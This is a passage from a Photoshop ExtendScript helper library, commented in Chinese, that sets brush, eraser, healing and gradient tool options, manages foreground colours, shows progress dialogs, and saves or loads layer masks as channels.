      opt.usePressureOverridesSize = toolOpt.getBoolean(sTID("usePressureOverridesSize")); //启用压力大小
      opt.repeat = toolOpt.getBoolean(sTID("repeat")); //启用气刷
      opt.useTipDynamics = toolOpt.getBoolean(sTID("useTipDynamics")); //启用形状动态
      opt.usePaintDynamics = toolOpt.getBoolean(sTID("usePaintDynamics")); //启用传递
      // opt.useScatter = toolOpt.getBoolean(sTID("useScatter")); //启用散布
      opt.Mode = toolOpt.getInteger(cTID('ErsB'));
      if (tool != "eraserTool") _this.selTool(tool);
      return opt;
    }
    var _this = this;
    switch (toolName) {
      case "paintbrushTool": return _getPaintbrushToolOptions();
      case "spotHealingBrushTool": return _getSpotHealingBrushToolOptions();
      case "magicStampTool": return _getMagicStampToolOptions();
      case "wetBrushTool": return _getWetBrushToolOptions();
      case "eraserTool": return _getEraserToolOptions();
    }
  },
  setSpotHealingBrushTool: function (arg) { //设置污点修复画笔选项
    var result = !1;
    if (typeof arg != "object") arg = { //全局默认属性
      Size: 50, //大小
      Hardn: 0, //硬度
      Space: 10, //间距
      Angle: 0, //角度
      Roundness: 100, //圆度
      StmS: false, //对所有图层取样
      SmmS: 'CntW', //类型
      healSmoothFactor: 5, //扩散
      Mode: "normal", //图层模式
      usePressureOverridesSize: false, //启用压力大小
    }; else if (arg.hasOwnProperty("defValue")) arg = arg.defValue; //功能默认属性
    this.selTool("spotHealingBrushTool");  //设置工具
    try {
      //设置属性
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(sTID("spotHealingBrushTool"));
      desc1.putReference(sTID("null"), ref1);
      var desc2 = new ActionDescriptor();
      if (arg.hasOwnProperty("Mode")) desc2.putEnumerated(sTID("mode"), sTID("blendModel"), sTID(arg.Mode)); //图层模式
      if (arg.hasOwnProperty("StmS")) desc2.putBoolean(cTID('StmS'), arg.StmS); //当前图层/当前和下方图层
      if (arg.hasOwnProperty("SmmS")) desc2.putEnumerated(cTID('SmmS'), cTID("SmmT"), cTID(arg.SmmS)); //当前图层/当前和下方图层/所有图层
      if (arg.hasOwnProperty("usePressureOverridesSize")) desc2.putBoolean(sTID('usePressureOverridesSize'), arg.usePressureOverridesSize); //对齐
      if (arg.hasOwnProperty("healSmoothFactor")) desc2.putInteger(sTID('healSmoothFactor'), arg.healSmoothFactor); //扩散
      desc1.putObject(sTID("to"), sTID("null"), desc2);
      app.executeAction(sTID("set"), desc1, DialogModes.NO);
      //设置笔刷
      if (arg.hasOwnProperty("Size")) {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID("Brsh"), cTID("Ordn"), cTID("Trgt"));
        desc1.putReference(cTID("null"), ref1);
        var desc2 = new ActionDescriptor();
        if (arg.hasOwnProperty("Size")) desc2.putUnitDouble(cTID('Dmtr'), cTID('#Pxl'), arg.Size);  //大小
        if (arg.hasOwnProperty("Hardn")) desc2.putUnitDouble(cTID('Hrdn'), cTID('#Prc'), arg.Hardn);  //硬度
        if (arg.hasOwnProperty("Angle")) desc2.putUnitDouble(cTID('Angl'), cTID('#Ang'), arg.Angle);  //角度
        if (arg.hasOwnProperty("Roundness")) desc2.putUnitDouble(cTID('Rndn'), cTID('#Prc'), arg.Roundness);  //圆度
        if (arg.hasOwnProperty("Space")) desc2.putUnitDouble(cTID('Spcn'), cTID('#Prc'), arg.Space);  //间距
        desc1.putObject(sTID("to"), cTID("Brsh"), desc2);
        app.executeAction(cTID("setd"), desc1, DialogModes.NO);
      }
      result = !0;
    } catch (e) { }
    return result
  },
  setMagicStampTool: function (arg) { //设置修复画笔选项
    var result = !1;
    if (typeof arg != "object") arg = { //全局默认属性
      Size: 50, //大小
      Hardn: 25, //硬度
      Space: 1, //间距
      Angle: 45, //角度
      Roundness: 3, //圆度
      StmS: false, //当前和下方图层
      StmB: true, //当前图层/当前和下方图层/所有图层
      StmA: false, //对齐
      healSmoothFactor: 5, //扩散
      Mode: "normal", //图层模式
    }; else if (arg.hasOwnProperty("defValue")) arg = arg.defValue; //功能默认属性
    this.selTool("magicStampTool");  //设置工具
    try {
      //设置属性
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(sTID("magicStampTool"));
      desc1.putReference(sTID("null"), ref1);
      var desc2 = new ActionDescriptor();
      if (arg.hasOwnProperty("Mode")) desc2.putEnumerated(sTID("mode"), sTID("blendModel"), sTID(arg.Mode)); //图层模式
      if (arg.hasOwnProperty("StmS")) desc2.putBoolean(cTID('StmS'), arg.StmS); //当前图层/当前和下方图层
      if (arg.hasOwnProperty("StmB")) desc2.putBoolean(cTID('StmB'), arg.StmB); //当前图层/当前和下方图层/所有图层
      if (arg.hasOwnProperty("StmA")) desc2.putBoolean(cTID('StmA'), arg.StmA); //对齐
      if (arg.hasOwnProperty("healSmoothFactor")) desc2.putInteger(sTID('healSmoothFactor'), arg.healSmoothFactor); //扩散
      desc2.putEnumerated(cTID('SmpS'), cTID('SmpT'), cTID('SrcS')); //源：取样
      desc1.putObject(sTID("to"), sTID("null"), desc2);
      app.executeAction(sTID("set"), desc1, DialogModes.NO);
      //设置笔刷
      if (arg.hasOwnProperty("Size")) {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID("Brsh"), cTID("Ordn"), cTID("Trgt"));
        desc1.putReference(cTID("null"), ref1);
        var desc2 = new ActionDescriptor();
        if (arg.hasOwnProperty("Size")) desc2.putUnitDouble(cTID('Dmtr'), cTID('#Pxl'), arg.Size);  //大小
        if (arg.hasOwnProperty("Hardn")) desc2.putUnitDouble(cTID('Hrdn'), cTID('#Prc'), arg.Hardn);  //硬度
        if (arg.hasOwnProperty("Angle")) desc2.putUnitDouble(cTID('Angl'), cTID('#Ang'), arg.Angle);  //角度
        if (arg.hasOwnProperty("Roundness")) desc2.putUnitDouble(cTID('Rndn'), cTID('#Prc'), arg.Roundness);  //圆度
        if (arg.hasOwnProperty("Space")) desc2.putUnitDouble(cTID('Spcn'), cTID('#Prc'), arg.Space);  //间距
        desc1.putObject(sTID("to"), cTID("Brsh"), desc2);
        app.executeAction(cTID("setd"), desc1, DialogModes.NO);
      }
      result = !0;
    } catch (e) { }
    return result
  },
  setWetBrushTool: function (arg) { //设置混合画笔选项
    var result = !1;
    if (typeof arg != "object") arg = { //全局默认属性
      diameter: 150, //大小
      hardness: 0, //硬度
      wetness: 100, //潮湿
      mix: 50, //混合
      dryness: 1, //载入
      flow: 30, //流量
      autoClean: !0 //清理画笔
    }; else if (arg.hasOwnProperty("defValue")) arg = arg.defValue; //功能默认属性
    this.selTool("wetBrushTool");  //设置为混合笔刷工具
    try {
      //设置属性
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(sTID("wetBrushTool"));
      desc1.putReference(sTID("null"), ref1);
      var desc2 = new ActionDescriptor();
      if (arg.hasOwnProperty("wetness")) desc2.putUnitDouble(sTID("wetness"), sTID("percentUnit"), arg.wetness);  //潮湿
      if (arg.hasOwnProperty("mix")) desc2.putUnitDouble(sTID("mix"), sTID("percentUnit"), arg.mix);  //混合
      if (arg.hasOwnProperty("dryness")) desc2.putUnitDouble(sTID("dryness"), sTID("percentUnit"), arg.dryness);  //载入
      if (arg.hasOwnProperty("flow")) desc2.putUnitDouble(sTID("flow"), sTID("percentUnit"), arg.flow);  //流量
      if (arg.hasOwnProperty("usePressureOverridesSize")) desc2.putBoolean(sTID("usePressureOverridesSize"), arg.usePressureOverridesSize);  //
      if (arg.hasOwnProperty("usePressureOverridesOpacity")) desc2.putBoolean(sTID("usePressureOverridesOpacity"), arg.usePressureOverridesOpacity);  //
      if (arg.hasOwnProperty("useLegacy")) desc2.putBoolean(sTID("useLegacy"), arg.useLegacy);  //
      if (arg.hasOwnProperty("sampleAllLayers")) desc2.putBoolean(sTID("sampleAllLayers"), arg.sampleAllLayers);  //
      if (arg.hasOwnProperty("reservoirState")) desc2.putInteger(sTID("reservoirState"), arg.reservoirState);  //
      if (arg.hasOwnProperty("autoFill")) desc2.putBoolean(sTID("autoFill"), arg.autoFill);  //
      if (arg.hasOwnProperty("loadSolidColorOnly")) desc2.putBoolean(sTID("loadSolidColorOnly"), arg.loadSolidColorOnly);  //清理画笔
      if (arg.hasOwnProperty("autoClean")) desc2.putBoolean(sTID("autoClean"), arg.autoClean);  //清理画笔
      desc2.putBoolean(sTID("useScatter"), !1);  //散布
      desc1.putObject(sTID("to"), sTID("null"), desc2);
      app.executeAction(sTID("set"), desc1, DialogModes.NO);
      //设置笔刷大小
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("Brsh"), cTID("Ordn"), cTID("Trgt"));
      desc1.putReference(cTID("null"), ref1);
      var desc2 = new ActionDescriptor();
      if (arg.hasOwnProperty("diameter")) desc2.putUnitDouble(cTID('Dmtr'), cTID('#Pxl'), arg.diameter);  //大小
      if (arg.hasOwnProperty("hardness")) desc2.putUnitDouble(cTID('Hrdn'), cTID('#Prc'), arg.hardness);  //硬度
      desc1.putObject(sTID("to"), sTID("wetBrushTool"), desc2);
      app.executeAction(cTID("setd"), desc1, DialogModes.NO);
      result = !0;
    } catch (e) { }
    return result
  },
  setMoveTool: function (arg) { //设置移动工具
    arg = arg || {}
    var d = new ActionDescriptor();
    var r = new ActionReference();
    r.putClass(sTID("moveTool"));
    d.putReference(sTID("null"), r);
    var d2 = new ActionDescriptor();
    if (arg.hasOwnProperty("isAutoSel")) d2.putBoolean(cTID('AtSl'), arg.isAutoSel); //自动选择
    if (arg.hasOwnProperty("isGroup")) d2.putBoolean(cTID('ASGr'), arg.isGroup); //组
    if (arg.hasOwnProperty("isShowControl")) d2.putBoolean(cTID('Abbx'), arg.isShowControl); //显示变换控件
    d.putObject(sTID("to"), sTID("null"), d2);
    app.executeAction(sTID("set"), d, DialogModes.NO);
  },
  setGradientTool: function (opt) { //设置渐变工具选项
    opt = opt || {};
    // opt.Mode = "normal"; //模式
    // opt.Opacity = 100; //不透明度
    // opt.GradientType = 0; //类型：0线性渐变，1径向渐变
    // opt.ColorStop1 = {H:13,S:91,B:76,Type:"userStop",Location:0,Midpoint:50}; //左边1
    // opt.ColorStop2 = {Type:"foregroundColor",Location:4096,Midpoint:50}; //左边2
    // opt.TransparencyStop1 = {Opacity:100,Location:0,Midpoint:50}; //右边1
    // opt.TransparencyStop2 = {Opacity:0,Location:4096,Midpoint:50}; //右边2
    this.selTool("gradientTool");  //设置工具
    //设置属性
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putClass(sTID("gradientTool"));
    desc1.putReference(sTID("null"), ref1);
    var desc2 = new ActionDescriptor();
    if (opt.hasOwnProperty("Mode")) desc2.putEnumerated(sTID("mode"), sTID("blendModel"), sTID(opt.Mode)); //图层模式
    if (opt.hasOwnProperty("Opacity")) desc2.putInteger(cTID("Opct"), opt.Opacity); //不透明度
    if (opt.hasOwnProperty("GradientType")) desc2.putInteger(cTID("GrdT"), opt.GradientType); //类型
    if (opt.hasOwnProperty("GrdD")) desc2.putInteger(cTID("GrdD"), opt.GrdD); //仿色
    if (opt.hasOwnProperty("GrdU")) desc2.putInteger(cTID("GrdU"), opt.GrdU); //透明区域
    if (opt.hasOwnProperty("GrdR")) desc2.putInteger(cTID("GrdR"), opt.GrdR); //反向
    var desc3 = new ActionDescriptor();
    // var ref2 = new ActionReference();
    // ref2.putEnumerated(cTID("Grad"), cTID("Ordn"), cTID("Trgt"));
    // desc3.putReference(cTID("null"), ref2);

    desc3.putEnumerated(cTID("GrdF"), cTID("GrdF"), sTID(opt.GradientForm));
    desc3.putDouble(cTID("Intr"), opt.Interpolation);

    // var list1 = new ActionList();
    // var desc4 = new ActionDescriptor();
    // var desc5 = new ActionDescriptor();
    // desc5.putClass(cTID("Clr "), cTID("HSBC"));
    // desc5.putUnitDouble(cTID("H   "), cTID("#Ang"), opt.ColorStop1.H);
    // desc5.putDouble(cTID("Strt"), opt.ColorStop1.S);
    // desc5.putDouble(cTID("Brgh"), opt.ColorStop1.B);
    // desc4.putObject(sTID("to"), cTID("Clrt"), desc5);
    // desc4.putEnumerated(cTID("Type"), cTID("Clry"), sTID(opt.ColorStop1.Type));
    // desc4.putInteger(cTID("Lctn"), opt.ColorStop1.Location);
    // desc4.putInteger(cTID("Mdpn"), opt.ColorStop1.Midpoint);
    // list1.putObject(cTID("Clrt"), desc4);
    // var desc6 = new ActionDescriptor();
    // desc6.putEnumerated(cTID("Type"), cTID("Clry"), sTID(opt.ColorStop2.Type));
    // desc6.putInteger(cTID("Lctn"), opt.ColorStop2.Location);
    // desc6.putInteger(cTID("Mdpn"), opt.ColorStop2.Midpoint);
    // list1.putObject(cTID("Clrt"), desc6);
    // desc3.putList(cTID('Clrs'), list1);

    desc1.putObject(sTID("to"), cTID("Grad"), desc3);
    desc1.putObject(sTID("to"), sTID("null"), desc2);
    app.executeAction(sTID("set"), desc1, DialogModes.NO);
    //设置笔刷
    // var desc1 = new ActionDescriptor();
    // var ref1 = new ActionReference();
    // ref1.putEnumerated(cTID("Grad"), cTID("Ordn"), cTID("Trgt"));
    // desc1.putReference(cTID("null"), ref1);
    // var desc2 = new ActionDescriptor();
    // desc2.putEnumerated(cTID("GrdF"), cTID("GrdF"), sTID(opt.GradientForm));
    // desc2.putDouble(cTID("Intr"), opt.Interpolation);
    // desc1.putObject(sTID("to"), cTID("Grad"), desc2);
    // app.executeAction(cTID("setd"), desc1, DialogModes.NO);
  },
  getForegroundColor: function () { //获取前景色
    return '#' + app.foregroundColor.rgb.hexValue
  },
  selTool: function (iTool, iColor) { //选择工具
    iTool = iTool || "marqueeRectTool";  //工具名称：默认为框选工具
    //笔刷工具：paintbrushTool
    //污点修复工具：spotHealingBrushTool
    //修补工具：patchSelection
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(sTID(iTool));
      desc1.putReference(sTID("null"), ref1);
      app.executeAction(sTID("select"), desc1, DialogModes.NO);
      if (iColor) this.setPsColor(iColor);
      return !0;
    } catch (e) { return !1 }
  },
  setPsColor: function (iColor) { //设置前景色/背景色
    //iColor: 1/前黑，2/前白，其它/前景色
    //颜色复位(D)
    // var desc1 = new ActionDescriptor();
    // var ref1 = new ActionReference();
    // ref1.putProperty(cTID('Clr '), cTID('Clrs'));
    // desc1.putReference(cTID('null'), ref1);
    // app.executeAction(sTID('reset'), desc1, DialogModes.NO);
    // _resetX = function(){ //颜色交换(X)
    //   var desc1 = new ActionDescriptor();
    //   var ref1 = new ActionReference();
    //   ref1.putProperty(cTID('Clr '), cTID('Clrs'));
    //   desc1.putReference(cTID('null'), ref1);
    //   app.executeAction(sTID('exchange'), desc1, DialogModes.NO);
    // }
    _setColor = function (iColor, isBack) {
      if (typeof iColor != 'object') return;
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Clr '), cTID(isBack ? 'BckC' : 'FrgC'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putDouble(cTID('Rd  '), iColor[0]);
      desc2.putDouble(cTID('Grn '), iColor[1]);
      desc2.putDouble(cTID('Bl  '), iColor[2]);
      desc1.putObject(cTID('T   '), cTID('RGBC'), desc2);
      desc1.putString(cTID('Srce'), "photoshopPicker");
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
    }
    if (app.activeDocument.activeLayer.kind == LayerKind.SOLIDFILL)
      var SOLIDFILL = this.getColorLayerByName();
    if (iColor == 1) { //前黑
      app.foregroundColor.rgb.hexValue = '000000';
      app.backgroundColor.rgb.hexValue = 'FFFFFF';
    } else if (iColor == 2) { //前白
      app.foregroundColor.rgb.hexValue = 'FFFFFF';
      app.backgroundColor.rgb.hexValue = '000000';
    } else _setColor(this.hexToRgb(iColor)); //前景色
    if (app.activeDocument.activeLayer.kind == LayerKind.SOLIDFILL)
      this.setColorLayerByName(SOLIDFILL);
  },
  setPaintbrushTool: function (arg) { //设置画笔工具选项
    var result = !1;
    if (typeof arg != "object") arg = { //全局默认属性
      Size: 120, //大小
      Hardn: 0, //硬度
      Opacity: 100, //不透明度
      Flow: 30, //流量
      Mode: "normal", //图层模式
      Color: 1 //前景白
    }; else if (arg.hasOwnProperty("defValue")) arg = arg.defValue; //功能默认属性
    this.selTool("paintbrushTool", arg.Color);  //设置为笔刷工具
    try {
      //设置笔刷
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(sTID("paintbrushTool"));
      desc1.putReference(sTID("null"), ref1);
      var desc2 = new ActionDescriptor();
      if (arg.hasOwnProperty("Opacity")) desc2.putUnitDouble(sTID("opacity"), sTID("percentUnit"), arg.Opacity);  //不透明度
      if (arg.hasOwnProperty("Mode")) desc2.putEnumerated(sTID("mode"), sTID("blendModel"), sTID(arg.Mode));  //图层模式
      if (arg.hasOwnProperty("Flow")) desc2.putUnitDouble(sTID("flow"), sTID("percentUnit"), arg.Flow);  //流量
      if (arg.hasOwnProperty("Smooth")) desc2.putUnitDouble(cTID("Smoo"), sTID("percentUnit"), arg.Smooth);  //平滑
      if (arg.hasOwnProperty("smoothingValue")) desc2.putUnitDouble(sTID("smoothingValue"), sTID("percentUnit"), arg.smoothingValue);  //平滑
      if (arg.hasOwnProperty("smoothing")) desc2.putBoolean(sTID("smoothing"), arg.smoothing);  //启用平滑
      if (arg.hasOwnProperty("usePressureOverridesOpacity")) desc2.putBoolean(sTID("usePressureOverridesOpacity"), arg.usePressureOverridesOpacity);  //启用压力不透明
      if (arg.hasOwnProperty("usePressureOverridesSize")) desc2.putBoolean(sTID("usePressureOverridesSize"), arg.usePressureOverridesSize);  //启用压力大小
      if (arg.hasOwnProperty("repeat")) desc2.putBoolean(sTID("repeat"), arg.repeat);  //启用气刷
      if (arg.hasOwnProperty("useTipDynamics")) desc2.putBoolean(sTID("useTipDynamics"), arg.useTipDynamics);  //形状动态
      if (arg.hasOwnProperty("usePaintDynamics")) desc2.putBoolean(sTID("usePaintDynamics"), arg.usePaintDynamics);  //传递
      desc2.putBoolean(sTID("useScatter"), !1);  //散布
      desc1.putObject(sTID("to"), sTID("null"), desc2);
      app.executeAction(sTID("set"), desc1, DialogModes.NO);
      // //设置形状动态里面的控制选项
      // if (arg.useTipDynamics) {
      //   var desc1 = new ActionDescriptor();
      //   var ref1 = new ActionReference();
      //   ref1.putEnumerated(cTID("szVr"), cTID("Ordn"), cTID("Trgt"));
      //   desc1.putReference(cTID("null"), ref1);
      //   var desc2 = new ActionDescriptor();
      //   if (arg.hasOwnProperty("bVTy")) desc2.putInteger(cTID("bVTy"), arg.bVTy);  //控制选项
      //   desc1.putObject(sTID("to"), cTID("szVr"), desc2);
      //   app.executeAction(cTID("setd"), desc1, DialogModes.NO);
      // }
      //设置笔刷大小
      if (arg.hasOwnProperty("Size")) {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID("Brsh"), cTID("Ordn"), cTID("Trgt"));
        desc1.putReference(cTID("null"), ref1);
        var desc2 = new ActionDescriptor();
        desc2.putUnitDouble(cTID('Dmtr'), cTID('#Pxl'), arg.Size);  //大小
        if (arg.hasOwnProperty("Hardn")) desc2.putUnitDouble(cTID('Hrdn'), cTID('#Prc'), arg.Hardn);  //硬度
        if (arg.hasOwnProperty("Angle")) desc2.putUnitDouble(cTID('Angl'), cTID('#Ang'), arg.Angle);  //角度
        // desc2.putUnitDouble(cTID('Rndn'), cTID('#Prc'), 100);  //圆度
        // desc2.putUnitDouble(cTID('Spcn'), cTID('#Prc'), 10);  //间距
        // desc2.putBoolean(cTID('Intr'), true);
        // desc2.putBoolean(sTID("flipX"), false);
        // desc2.putBoolean(sTID("flipY"), false);
        desc1.putObject(sTID("to"), cTID("Brsh"), desc2);
        app.executeAction(cTID("setd"), desc1, DialogModes.NO);
      }
      if (arg.hasOwnProperty("Color")) this.setPsColor(arg.Color);
      result = !0;
    } catch (e) { }
    return result
  },
  setEraserTool: function (arg) { //设置擦除工具选项
    var result = !1;
    if (typeof arg != "object") arg = { //全局默认属性
      Size: 150, //大小
      Hardn: 20, //硬度
      Opacity: 100, //不透明度
      Flow: 30 //流量
    }; else if (arg.hasOwnProperty("defValue")) arg = arg.defValue; //功能默认属性
    this.selTool("eraserTool");  //设置为擦除工具
    try {
      //设置笔刷
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(sTID("eraserTool"));
      desc1.putReference(sTID("null"), ref1);
      var desc2 = new ActionDescriptor();
      if (arg.hasOwnProperty("Mode")) desc2.putInteger(cTID("ErsB"), arg.Mode);  //模式
      if (arg.hasOwnProperty("Opacity")) desc2.putUnitDouble(sTID("opacity"), sTID("percentUnit"), arg.Opacity);  //不透明度
      if (arg.hasOwnProperty("Flow")) desc2.putUnitDouble(sTID("flow"), sTID("percentUnit"), arg.Flow);  //流量
      if (arg.hasOwnProperty("Smooth")) desc2.putUnitDouble(cTID("Smoo"), sTID("percentUnit"), arg.Smooth);  //平滑
      if (arg.hasOwnProperty("usePressureOverridesOpacity")) desc2.putBoolean(sTID("usePressureOverridesOpacity"), arg.usePressureOverridesOpacity);  //启用压力不透明
      if (arg.hasOwnProperty("usePressureOverridesSize")) desc2.putBoolean(sTID("usePressureOverridesSize"), arg.usePressureOverridesSize);  //启用压力大小
      if (arg.hasOwnProperty("repeat")) desc2.putBoolean(sTID("repeat"), arg.repeat);  //启用气刷
      if (arg.hasOwnProperty("useTipDynamics")) desc2.putBoolean(sTID("useTipDynamics"), arg.useTipDynamics);  //形状动态
      if (arg.hasOwnProperty("usePaintDynamics")) desc2.putBoolean(sTID("usePaintDynamics"), arg.usePaintDynamics);  //传递
      desc2.putBoolean(sTID("useScatter"), !1);  //散布
      desc1.putObject(sTID("to"), sTID("null"), desc2);
      app.executeAction(sTID("set"), desc1, DialogModes.NO);
      //设置笔刷大小
      if (arg.hasOwnProperty("Size")) {
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID("Brsh"), cTID("Ordn"), cTID("Trgt"));
        desc1.putReference(cTID("null"), ref1);
        var desc2 = new ActionDescriptor();
        desc2.putUnitDouble(cTID('Dmtr'), cTID('#Pxl'), arg.Size);  //大小
        if (arg.hasOwnProperty("Hardn")) desc2.putUnitDouble(cTID('Hrdn'), cTID('#Prc'), arg.Hardn);  //硬度
        desc1.putObject(sTID("to"), cTID("Brsh"), desc2);
        app.executeAction(cTID("setd"), desc1, DialogModes.NO);
      }
      result = !0;
    } catch (e) { }
    return result
  },
  showProgress_old: function (win, text) { //运行提示框
    win = new Window("palette", text);
    win.margins = [100, 30, 100, 30];
    win.opacity = 0.8;
    win.alignChildren = ["center", "center"];
    var staticText = win.add("staticText", undefined, localize($.local.textProgress), { name: "staticText" });
    win.onClose = function () {
      win = null;
      delete win;
      $.gc();
    };
    win.onDeactivate = function () {
      try {
        win.active = true;
        win.update();
      } catch (e) { };
    };
    win.show();
    return win;
  },
  showProgress: function (text, timer) { //打开提示窗口
    if (Progress) {
      progressText.text = localize(timer ? $.local.promptProgress : $.local.textProgress) + text;
      Progress.update();
    } else {//isDialog?"dialog":
      Progress = new Window("palette", undefined, undefined);
      Progress.preferredSize.width = 300;
      Progress.preferredSize.height = 100;
      Progress.orientation = "column";
      Progress.alignChildren = ["center", "top"];
      Progress.spacing = 10;
      Progress.margins = 16;
      Progress.opacity = 0.9;
      progressText = Progress.add("staticText", undefined, localize(timer ? $.local.promptProgress : $.local.textProgress) + text);
      progressText.preferredSize.width = 360;
      progressText.preferredSize.height = 60;
      progressText.justify = "center";
      progressText.alignment = ["center", "top"];
      progressText.graphics.font = "Microsoft YaHei UI:16";
      Progress.onClose = function () {
        Progress = null;
        delete Progress;
        $.gc();
      };
      Progress.onDeactivate = function () {
        try {
          Progress.active = true;
          Progress.update();
        } catch (e) { };
      };
      Progress.show();
    }
    if (timer) $.sleep(timer);
  },
  showDialog: function (text) { //打开提示窗口
    if (pDialog) {
      progressText.text = localize($.local.textProgress) + text;
      pDialog.update();
    } else {
      pDialog = new Window($.os.indexOf("Windows") > -1 ? "dialog" : "palette", undefined, undefined);
      pDialog.preferredSize.width = 300;
      pDialog.preferredSize.height = 100;
      pDialog.orientation = "column";
      pDialog.alignChildren = ["center", "top"];
      pDialog.spacing = 10;
      pDialog.margins = 16;
      pDialog.opacity = 0.9;
      progressText = pDialog.add("staticText", undefined, localize($.local.textProgress) + text);
      progressText.preferredSize.width = 360;
      progressText.preferredSize.height = 60;
      progressText.justify = "center";
      progressText.alignment = ["center", "top"];
      progressText.graphics.font = "Microsoft YaHei UI:16";
      pDialog.onClose = function () {
        pDialog = null;
        delete pDialog;
        $.gc();
      };
      pDialog.onDeactivate = function () {
        try {
          pDialog.active = true;
          pDialog.update();
        } catch (e) { };
      };
      pDialog.show();
    }
  },
  closeProgress: function (isDialog) { //关闭提示窗口
    try {
      if (isDialog) { pDialog.close(); pDialog = null; $.gc() }
      else { Progress.close(); Progress = null; $.gc() }
    } catch (e) { };
  },
  dialog: function (title, txt) { //提示框
    var result = false;
    try {
      var win = new Window("dialog", title, undefined, {
        closeButton: true
      });
      win.graphics.font = "dialog:11";
      win.orientation = "row";
      win.alignChildren = ["fill", "fill"];
      // win.left = win.add("image", undefined, _0x21EE1);
      win.right = win.add("group");
      win.right.orientation = "column";
      win.right.preferredSize.width = 200;
      win.right.txt = win.right.add("statictext", undefined, undefined, {
        multiline: true
      });
      win.right.txt.alignment = ["fill", "middle"];
      win.right.txt.text = txt;
      win.right.buttons = win.right.add("group");
      win.right.buttons.alignment = ["fill", "bottom"];
      win.right.buttons.orientation = "row";
      win.right.buttons.alignChildren = ["fill", "bottom"];
      win.right.buttons.cancel = win.right.buttons.add("button", undefined, "关闭", {
        name: "Close"
      });
      win.right.buttons.cancel.onClick = function () {
        win.close();
        win = null;
        delete win;
        $.gc();
      };
      win.onClose = function () {
        win = null;
        delete win;
        $.gc();
      };
      win.onDeactivate = function () {
        try {
          win.active = true;
          win.update();
        } catch (e) { }
      };
      win.show();
    } catch (e) { }
    return result;
  },
  putCustomOptions: function (key, value, persistent) { //存储自定义值
    try {
      var desc1 = new ActionDescriptor();
      desc1.putString(0, value);
      app.putCustomOptions(key, desc1, persistent);
    } catch (e) {
      return "RG_FL";
    }
  },
  getCustomOptions: function (key) { //获取自定义值
    try {
      var desc1 = app.getCustomOptions(key);
      return desc1.getString(0);
    } catch (e) {
      return 0;
    }
  },
  hasUserMask: function (id) { // -1:没有蒙板/0:禁用蒙板/1:使用蒙板
    var ref = new ActionReference();
    if (id != undefined) ref.putIdentifier(cTID('Lyr '), id);
    else ref.putEnumerated(1283027488, 1332896878, 1416783732);
    var desc = app.executeActionGet(ref);
    if (!desc) return -1;
    if (!desc.hasKey(1433629261)) {
      return -1;
    } else {
      if (desc.getBoolean(1433629261)) return 1;
    }
    return 0;
  },
  layerEffects: function (id) {
    var ref = new ActionReference();
    if (id != undefined) ref.putIdentifier(cTID('Lyr '), id);
    else ref.putEnumerated(1283027488, 1332896878, 1416783732);
    var desc = app.executeActionGet(ref);
    if (!desc) return -1;
    if (!desc.hasKey(cTID('Lefx'))) {
      return -1;
    } else {
      if (desc.getBoolean(cTID('lfxv'))) return 1;
    }
    return 0;
  },
  saveMask: function (maskName) { //保存蒙板为通道
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putProperty(cTID('Chnl'), sTID("selection"));
    desc1.putReference(cTID('null'), ref1);
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Msk '));
    desc1.putReference(cTID('T   '), ref2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(cTID('Chnl'), maskName);
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('T   '), ref2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
    } catch (e) {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      desc1.putString(cTID('Nm  '), maskName);
      app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
    }
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putProperty(cTID('Chnl'), sTID("selection"));
    desc1.putReference(cTID('null'), ref1);
    desc1.putEnumerated(cTID('T   '), cTID('Ordn'), cTID('None'));
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
  },
  loadMask: function (maskName) {
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Msk '));
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('delete'), desc1, DialogModes.NO);
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putName(cTID('Chnl'), maskName);
      desc1.putReference(cTID('T   '), ref2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      var desc1 = new ActionDescriptor();
      desc1.putClass(cTID('Nw  '), cTID('Chnl'));
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Msk '));
      desc1.putReference(cTID('At  '), ref1);
      desc1.putEnumerated(cTID('Usng'), cTID('UsrM'), cTID('RvlS'));
      app.executeAction(sTID('make'), desc1, DialogModes.NO);
    } catch (e) { }
  },
